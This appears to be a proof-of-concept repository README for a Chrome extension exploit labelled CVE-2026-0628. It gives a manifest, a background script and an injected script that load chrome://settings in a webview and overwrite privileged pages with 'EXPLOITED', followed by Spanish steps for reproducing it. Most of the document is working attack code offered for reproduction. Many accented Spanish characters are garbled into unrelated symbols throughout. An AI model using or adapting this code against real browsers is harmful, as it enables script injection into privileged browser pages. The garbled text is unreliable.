1. manifest.json
json
{
  "manifest_version": 3,
  "name": "Malicious Extension PoC",
  "version": "1.0",
  "permissions": [
    "webview",
    "tabs",
    "activeTab"
  ],
  "background": {
    "service_worker": "background.js"
  },
  "web_accessible_resources": [
    {
      "resources": ["exploit/*"],
      "matches": ["<all_urls>"]
    }
  ]
}
2. background.js
javascript
chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
  if (changeInfo.status === "complete" && tab.url.includes("chrome://")) {
    chrome.scripting.executeScript({
      target: { tabId: tabId },
      files: ["exploit/inject.js"]
    });
  }
});
3. exploit/inject.js
javascript
const webview = document.createElement("webview");
webview.src = "chrome://settings";
webview.addEventListener("contentload", () => {
  webview.executeScript({
    code: `
      document.body.innerHTML = "<h1>EXPLOITED</h1>";
      console.log("Script inyectado con 칠xito en p치gina privilegiada");
    `
  });
});
document.body.appendChild(webview);
4. exploit/privileged.html
html
<!DOCTYPE html>
<html>
<head>
  <title>P치gina Privilegiada</title>
</head>
<body>
  <h1>Esta p치gina deber칤a ser segura</h1>
  <webview id="safe-webview" src="about:blank"></webview>
</body>
</html>
游 C칩mo Reproducir la Vulnerabilidad
Clona este repositorio:

bash
git clone https://github.com/tu-usuario/CVE-2026-0628-PoC.git
cd CVE-2026-0628-PoC
Carga la extensi칩n en Chrome:

Ve a chrome://extensions/.
Activa el "Modo de desarrollador".
Haz clic en "Cargar descomprimida" y selecciona este directorio.
Abre una p치gina privilegiada (por ejemplo, chrome://settings).

La extensi칩n inyectar치 autom치ticamente el script en la p치gina.
Observa el resultado:

El contenido de la p치gina ser치 reemplazado con "<h1>EXPLOITED</h1>".
